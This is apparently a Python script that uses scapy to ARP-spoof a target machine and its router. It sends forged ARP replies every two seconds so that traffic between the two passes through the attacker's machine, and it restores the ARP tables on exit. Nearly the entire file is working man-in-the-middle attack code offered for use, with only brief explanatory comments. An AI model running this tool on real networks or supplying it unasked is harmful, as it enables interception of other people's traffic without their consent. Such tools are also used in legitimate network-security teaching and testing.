#!/usr/bin/env python

import scapy.all as sc
import argparse as ap
import time
import sys

def get_ips():
	parser = ap.ArgumentParser()
	parser.add_argument("-t", "--target_ip", dest="target_ip", help="Add ip of target machine and then ip of router/gateway (e.g. -t 127.0.0.1 -r 192.1.1.2)")
	parser.add_argument("-r", "--router_ip", dest="router_ip", help="Add ip of target machine and then ip of router/gateway (-t 127.0.0.1 -r 192.1.1.2).")
	options = parser.parse_args()
	if not options.target_ip:
		parser.error("[-] A target IP needs to be specified.")
	elif not options.router_ip:
		parser.error("[-] A router IP needs to be specified.")
	else:
		return options

def get_mac_address(ip):
	arp_request = sc.ARP(pdst=ip)
	broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_broadcast_request = broadcast/arp_request
	# sending request to just one IP
	answer = sc.srp(arp_broadcast_request, timeout=1, verbose=False)[0]
	return answer[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	# get MAC address of target device
	target_mac = get_mac_address(target_ip)
	# hwdst is the MAC address of the target device
	# scapy sets MAC address to spoof device if hwsrc is not set
	packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	sc.send(packet, verbose=False)

def restore(destination_ip, source_ip):
	destination_mac = get_mac_address(destination_ip)
	#need to change MAC address from spoof MAC address to routter MAC address
	source_mac = get_mac_address(source_ip)
	#create an ARP response so set op = 2; the hwsrc sets MAC to other device. 
	packet = sc.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	sc.send(packet, count=4, verbose=False)
	print(packet.show())
	print(packet.summary())

ips = get_ips()

target_ip = ips.target_ip
router_ip = ips.router_ip

#keep connection going...
try:
	packets_sent_count = 0
	while True:
		#Tell target that spoof computer is the router.
		spoof(target_ip, router_ip)
		#Tell router that spoof computer is the target.
		spoof(router_ip, target_ip)
		#use dynamic printing to print count dynamically. print at start of line using \r
		#use for Python 2
		#	print("\r[+] Packets sent: " + str(packets_sent_count)),
		#	packets_sent_count = packets_sent_count + 2
		#	sys.stdout.flush()
		#Use for Python 3
		print("\r[+] Packets Sent: " + str(packets_sent_count), end="")
		packets_sent_count = packets_sent_count + 2
		#repeat every 2 seconds to make sure MAC address remains the same
		time.sleep(2)
except KeyboardInterrupt:
	print("\n [c] Detected Ctrl+C.....Resetting ARP tables......Quitting\n")
	restore(target_ip, router_ip)
	restore(router_ip, target_ip)

